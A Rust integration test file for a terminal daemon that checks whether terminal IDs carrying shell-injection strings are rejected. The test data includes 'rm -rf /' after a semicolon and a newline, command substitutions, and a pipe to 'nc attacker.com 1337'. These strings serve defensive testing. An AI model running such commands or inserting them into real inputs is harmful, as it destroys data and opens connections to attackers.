// Security integration tests - expect/unwrap are acceptable here since tests should panic on failure
#![allow(clippy::expect_used)]
#![allow(clippy::unwrap_used)]

mod common;

use common::{cleanup_all_loom_sessions, TestClient, TestDaemon};
use serial_test::serial;

/// Cleanup helper to run before/after each test.
///
/// Deliberately uses the host-wide `cleanup_all_loom_sessions()` rather than
/// the `TEST_PREFIX`-scoped `cleanup_test_sessions()` (issue #4622). This is a
/// reviewed exception, not an oversight: several tests below intentionally
/// pass hardcoded, unprefixed terminal IDs — `terminal-1`, `isolated-terminal`,
/// `test-symlink`, `test-traversal`, `test-sensitive`, etc. — either as the
/// injection payload under test, or to exercise "accept a valid ID" /
/// isolation / symlink / traversal paths. `create_terminal` uses that ID as
/// both `config_id` and the tmux session name (`loom-{id}-{role}-{instance}`),
/// so those real sessions never carry `TEST_PREFIX` and `cleanup_test_sessions()`
/// cannot see or remove them, leaving stale sessions that would collide with
/// (or be silently reused by) a later run.
///
/// Known trade-off: on a genuinely shared host this can still kill another
/// user's sessions or a live production `loom-daemon`'s real sessions. These
/// `integration_*` suites are confined to the `daemon-integration` nextest
/// test group (`max-threads = 1`, see `.config/nextest.toml` /
/// `loom-daemon/src/lib.rs`) precisely because of hazards like this one.
fn setup() {
    cleanup_all_loom_sessions();
}

/// Security Test 1: Reject terminal ID with shell injection characters (semicolon)
#[tokio::test]
#[serial]
async fn test_reject_injection_semicolon() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt to create terminal with malicious ID containing semicolon
    let malicious_id = "normal; rm -rf /";
    let result = client.create_terminal(malicious_id, None).await;

    // Should fail with validation error
    assert!(result.is_err(), "Terminal creation with semicolon should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 2: Reject terminal ID with command substitution
#[tokio::test]
#[serial]
async fn test_reject_injection_command_substitution() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with $() command substitution
    let malicious_id = "$(whoami)";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(
        result.is_err(),
        "Terminal creation with command substitution should be rejected"
    );

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 3: Reject terminal ID with pipe character
#[tokio::test]
#[serial]
async fn test_reject_injection_pipe() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with pipe
    let malicious_id = "terminal|nc attacker.com 1337";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with pipe should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 4: Reject terminal ID with backticks
#[tokio::test]
#[serial]
async fn test_reject_injection_backticks() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with backtick command substitution
    let malicious_id = "`whoami`";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with backticks should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 5: Reject terminal ID with ampersand (background execution)
#[tokio::test]
#[serial]
async fn test_reject_injection_ampersand() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with ampersand
    let malicious_id = "terminal & evil-command";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with ampersand should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 6: Reject terminal ID with newline
#[tokio::test]
#[serial]
async fn test_reject_injection_newline() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with newline injection
    let malicious_id = "terminal\nrm -rf /";
    let result = client.create_terminal(malicious_id, None).await;

    assert!(result.is_err(), "Terminal creation with newline should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 7: Reject empty terminal ID
#[tokio::test]
#[serial]
async fn test_reject_empty_id() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Attempt with empty ID
    let result = client.create_terminal("", None).await;

    assert!(result.is_err(), "Empty terminal ID should be rejected");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 8: Accept valid terminal IDs with allowed characters
#[tokio::test]
#[serial]
async fn test_accept_valid_ids() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test various valid IDs
    let valid_ids = vec![
        "terminal-1",
        "terminal_2",
        "TERMINAL-3",
        "Terminal_4",
        "term123",
        "123term",
        "a-b-c_d_e",
    ];

    for id in valid_ids {
        let result = client.create_terminal(id, None).await;
        assert!(result.is_ok(), "Valid terminal ID '{id}' should be accepted");
    }

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 9: Reject terminal ID with special shell characters
#[tokio::test]
#[serial]
async fn test_reject_various_shell_chars() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test various problematic characters
    let malicious_chars = vec![
        "terminal>file",
        "terminal<file",
        "terminal*",
        "terminal?",
        "terminal[0]",
        "terminal{1}",
        "terminal'test'",
        "terminal\"test\"",
        "terminal\\test",
        "terminal/test",
        "terminal.test", // dots are commonly used in identifiers, but not allowed here
        "terminal@test", // @ is also risky
        "terminal#test", // # starts comments in shells
    ];

    for malicious_id in malicious_chars {
        let result = client.create_terminal(malicious_id, None).await;
        assert!(
            result.is_err(),
            "Terminal ID with special character '{malicious_id}' should be rejected"
        );
    }

    // Cleanup
    cleanup_all_loom_sessions();
}

// Working-directory validation is deliberately not tested here (#12722). The
// daemon does not reject symlinked, `..`-containing or system-directory working
// directories; `create_terminal` accepts them and tmux session isolation is the
// chosen control. CWE-59 protection lives at the `.git` symlink level in
// `find_git_root()`. Tests named `test_reject_*` for these inputs asserted
// nothing and were removed rather than left green-by-construction.

/// Security Test 12: Verify terminal isolation between clients
#[tokio::test]
#[serial]
async fn test_terminal_isolation_between_clients() {
    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");
    let mut client1 = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect client 1");
    let mut client2 = TestClient::connect(daemon.socket_path())
        .await
        .expect("Failed to connect client 2");

    // Client 1 creates a terminal
    let terminal_id = client1
        .create_terminal("isolated-terminal", None)
        .await
        .expect("Failed to create terminal");

    // Send input from Client 1
    client1
        .send_input(&terminal_id, "echo 'Client 1 message'\n")
        .await
        .expect("Failed to send input from client 1");

    // Wait for output to be available
    tokio::time::sleep(tokio::time::Duration::from_millis(500)).await;

    // Client 2 attempts to send input to Client 1's terminal (should work - shared terminal)
    let send_result = client2
        .send_input(&terminal_id, "echo 'Client 2 message'\n")
        .await;

    // In the current architecture, terminals are shared (not isolated per client)
    // This test documents the current behavior - terminals ARE shared
    assert!(
        send_result.is_ok(),
        "Terminals are currently shared between clients (not isolated)"
    );

    // However, verify that a non-existent terminal ID is rejected
    let invalid_result = client2.send_input("non-existent-terminal", "test\n").await;
    assert!(invalid_result.is_err(), "Sending to non-existent terminal should fail");

    // Cleanup
    cleanup_all_loom_sessions();
}

/// Security Test 13: Reject malicious JSON payload
#[tokio::test]
#[serial]
async fn test_reject_malicious_json() {
    // Import required traits and types
    use tokio::io::{AsyncBufReadExt, AsyncWriteExt, BufReader};
    use tokio::net::UnixStream;

    setup();

    let daemon = TestDaemon::start().await.expect("Failed to start daemon");

    let mut stream = UnixStream::connect(daemon.socket_path())
        .await
        .expect("Failed to connect");

    // Test 1: Deeply nested JSON (potential stack overflow)
    let deeply_nested = format!(
        r#"{{"type":"CreateTerminal","payload":{{"terminal_id":"test","nested":{}}}}}}}"#,
        "{{".repeat(1000)
    );

    stream
        .write_all(deeply_nested.as_bytes())
        .await
        .expect("Failed to write");
    stream.write_all(b"\n").await.expect("Failed to write");
    stream.flush().await.expect("Failed to flush");

    // Read response (should be error or timeout, not crash)
    let mut reader = BufReader::new(stream);
    let mut response = String::new();
    let read_result =
        tokio::time::timeout(tokio::time::Duration::from_secs(2), reader.read_line(&mut response))
            .await;

    // The daemon must answer the unparseable request with an error response
    // (serde_json's recursion limit rejects the nesting), not silently accept it.
    let read_len = read_result
        .expect("Daemon did not respond to deeply nested JSON within 2s")
        .expect("Failed to read response");
    assert!(read_len > 0, "Daemon closed the connection without an error response");
    assert!(
        response.to_lowercase().contains("error"),
        "Deeply nested JSON should yield an error response, got: {}",
        response.trim()
    );

    // Verify daemon is still responsive by connecting a new client
    let mut health_client = TestClient::connect(daemon.socket_path())
        .await
        .expect("Daemon should still be responsive after malicious JSON");

    // Verify daemon still works
    let ping_result = health_client.ping().await;
    assert!(ping_result.is_ok(), "Daemon should respond to ping after malicious JSON attack");

    // Cleanup
    cleanup_all_loom_sessions();
}

// Fail this test binary on any spawn of the real `gh` (#10225, extends #10138).
#[allow(dead_code)]
#[path = "../src/live_gh_guard.rs"]
mod live_gh_guard;
